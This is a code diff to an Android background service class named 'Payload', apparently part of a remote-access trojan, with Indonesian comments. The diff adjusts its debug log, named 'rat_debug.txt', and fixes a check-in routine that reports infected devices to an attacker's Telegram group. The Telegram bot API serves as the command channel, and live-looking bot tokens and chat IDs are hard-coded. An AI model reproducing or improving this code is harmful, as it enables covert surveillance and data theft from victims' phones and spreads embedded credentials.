@@ -38,16 +38,16 @@ public class Payload extends Service {
     private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
     private String BUILDER_TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo";
     
-    private String CHAT_ID = "8598136412"; // Chat pribadi buat nyedot data
-    private String GROUP_ID = "-1004405270823"; // ID Grup buat lapor diri
+    private String CHAT_ID = "8598136412"; // Chat pribadi
+    private String GROUP_ID = "-1004405270823"; // ID Grup
     
     private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
 
     private void writeLog(String msg) {
         try {
-            // Pindah ke getFilesDir (Internal) biar ga di-lock sistem
-            File file = new File(getFilesDir(), "rat_debug.txt");
+            // Balik ke External Files Dir biar gampang dicari
+            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
             FileOutputStream fos = new FileOutputStream(file, true);
             fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
             fos.close();
@@ -137,6 +137,7 @@ public class Payload extends Service {
                 sendTelegramMessage("🚀 *Service Active!*\nDevice: " + deviceName);
                 writeLog("4. Pesan Service Active terkirim/tertunda");
 
+                // --- INI YANG DIPERBAIKI ---
                 sendCheckIn(deviceName);
                 writeLog("5. CheckIn terkirim/tertunda");
 
@@ -191,7 +192,8 @@ public class Payload extends Service {
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
-            String urlStr = "https://api.telegram.org/bot" + BUILDER_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
+            // PAKAI BOT_TOKEN (Payload) BIAR BOT BUILDER BISA DENGER DARI GRUP
+            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
             new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
